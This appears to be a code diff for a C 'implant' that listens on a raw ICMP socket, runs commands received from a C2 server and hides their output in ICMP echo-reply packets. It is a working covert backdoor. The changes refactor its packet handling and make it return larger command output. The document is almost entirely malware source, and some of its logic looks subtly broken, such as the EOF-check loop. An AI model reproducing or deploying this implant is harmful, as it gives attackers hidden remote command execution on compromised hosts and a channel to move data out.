@@ -3,7 +3,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <arpa/inet.h>
-#include <linux/ip.h>
+//#include <linux/ip.h>
 #include "../include/implant.h"
 
 // creates a raw ICMP socket and binds it
@@ -46,7 +46,8 @@ unsigned short cksum(unsigned short *addr, int len) {
 // runs the command from the C2 and returns the output
 char *invoke_command(char *data) {
     FILE *ptr;
-    char *temp_buffer = (char *) calloc(4096, 1);
+    size_t init_size = BUFFER_SIZE;
+    char *temp_buffer = (char *) calloc(init_size, 1);
     char *buffer;
     char *command;
 
@@ -61,9 +62,17 @@ char *invoke_command(char *data) {
         return NULL;
     }
 
-    fread(temp_buffer, 4096, 1, ptr);
+    fread(temp_buffer, 1, BUFFER_SIZE, ptr);
+
+    // if we haven't reached EOF or NULL byte, reallocate and continue re-read
+    while (temp_buffer[strlen(temp_buffer)] != '\0') {
+        init_size *= 2;
+        temp_buffer = realloc(temp_buffer, init_size);
+        fread(temp_buffer, 1, init_size, ptr);
+    }
 
     buffer = calloc(strlen(temp_buffer), 1);
+    
     strncpy(buffer, temp_buffer, strlen(temp_buffer));
 
     free(temp_buffer);
@@ -80,6 +89,7 @@ int read_from_socket(int sockfd, char *buffer, int size) {
         perror("read()");
         return 0;
     }
+
     return 1;
 }
 
@@ -123,6 +133,45 @@ int check_magic_byte(struct icmphdr *icmp) {
     return 0;
 }
 
+// prep'ing the ICMP headers & setting up the checksum
+void prep_icmp_headers(struct icmphdr *icmp, char *data, uint16_t checksum) {
+    icmp->checksum = 0; // needs to be set before calculating for some weird reason
+    icmp->checksum = checksum;
+    icmp->type = 0;
+    icmp->un.echo.id = 9001;
+}
+
+/* TODO: return as raw bytes instead of chars for tty interaction */
+// reuse the ICMP packet to append our input in the data section
+void append_to_data_section(struct icmphdr *icmp, char *data, char *input) {
+    memcpy((char *) data, input, strlen(input));
+
+    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen(input));
+
+    prep_icmp_headers(icmp, data, checksum);
+}
+
+// prep'ing the IP headers for later usage
+struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
+    struct sockaddr_in addr;
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = ip->saddr;
+
+    return addr;
+}
+
+/* TODO: return as raw bytes instead of chars for tty interaction */
+// parse the data section
+char *parse_data_section(char *packet) {
+    // get the data section (ignoring the IP & ICMP headers )
+    char *data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
+    
+    data[strlen(data)] = '\0';
+
+    return data;
+}
+
 // the actual interaction occurs here
 void interact(int sockfd, char *dest_ip) {
     struct iphdr *ip; // holds the IP header
@@ -143,6 +192,7 @@ void interact(int sockfd, char *dest_ip) {
     if (packet == NULL || data == NULL) {
         fprintf(stdout, "Error: Cannot allocate memory\n");
         free(packet);
+        free(data);
         close(sockfd);
     }
 
@@ -160,24 +210,18 @@ void interact(int sockfd, char *dest_ip) {
         icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
 
         // set the IP & ICMP headers for later usage
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = ip->saddr;
-        icmp->type = 0;
+        addr = prep_ip_headers(ip);
 
-        // get the data section (ignoring the IP & ICMP headers + ICMP time data + junk prefix bytes)
-        data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
-        data[BUFFER_SIZE] = '\0';
+        // get the data section
+        data = parse_data_section(packet);
 
         // invoke the command
-        printf("[DEBUG] extracted data was: %sEOF\n", data);
         output = invoke_command(data);
-        printf("[DEBUG] output of command is: %sEOF\n", output);
+        
         // put the output in the data section of the ICMP packet
-        memcpy((char *) data, output, strlen(output));
+        append_to_data_section(icmp, data, output);    
 
-        // calculate the checksum
-        icmp->checksum = 0; // needs to be set before calculating for some weird reason
-        icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen(output));
+        data = NULL;
 
         // send it
         bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(output), 0, (struct sockaddr *) &addr, sizeof(addr));
@@ -186,7 +230,7 @@ void interact(int sockfd, char *dest_ip) {
             break;
         }
 
-        // clean up the packet buffer for the next usage
+        // clean up the packet & output buffers for reuse
         memset(packet, '\0', packet_size);
 
         free(output);
